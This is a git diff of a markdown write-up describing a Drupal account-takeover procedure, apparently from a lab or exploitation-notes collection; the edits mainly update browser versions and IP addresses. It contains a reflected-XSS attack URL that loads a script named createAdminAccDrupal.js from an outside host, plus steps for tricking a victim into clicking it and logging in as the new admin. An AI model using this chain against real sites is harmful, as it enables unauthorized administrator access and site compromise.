@@ -1,12 +1,12 @@
-# [Acc] Create New Admin User
+# [ATO] Create New Admin User
 
 ## Test Environment
 
-### Web Browsers (20240224)
+### Web Browsers (20250426)
 
-* [x] Mozilla Firefox Version 123.0 (64-bit)
-* [x] Google Chrome Version 122.0.6261.70 (64-bit)
-* [x] Microsoft Edge Version 122.0.2365.52 (64-bit)
+* [x] Mozilla Firefox 137.0.2 (64-bit)
+* [x] Google Chrome 135.0.7049.115 (64-bit)
+* [x] Microsoft Edge 135.0.3179.98 (64-bit)
 
 ## Exploitation Steps
 
@@ -16,7 +16,7 @@
 
     `newAccPass` - password of the user account to be created (**NOTE**: no password requirements)
 
-    `drupalRoot` - path to Drupal installation on the target system (e.g. `"/path"`)
+    `drupalRoot` - path to Drupal installation on the target system (e.g. `"/drupal"`)
 
 2. [setup exploit] setup web server (to serve the payload)
 
@@ -27,18 +27,18 @@
 4. [social engineering attack] victim user clicks link
 
     ```
-    http://192.168.5.17/test/rxss.php?q=<script src=http://192.168.5.15/createAdminAccDrupal.js></script>
+    http://192.168.5.17/rxss.php?q=<script src=http://192.168.5.5/createAdminAccDrupal.js></script>
     ```
 
     * **NOTES**:
       * `192.168.5.17` - target Drupal site
-      * `192.168.5.15` - web server hosting payload
+      * `192.168.5.5` - web server hosting payload
 
 5. [post exploit] attacker logs into target Drupal site using specified credentials
 
     http://192.168.5.17/user/login
 
-## Screenshots
+## Screenshot
 
 * **NOTE**: the screenshot covers steps 1 to 4 from the "Exploitation Steps" chapter
 
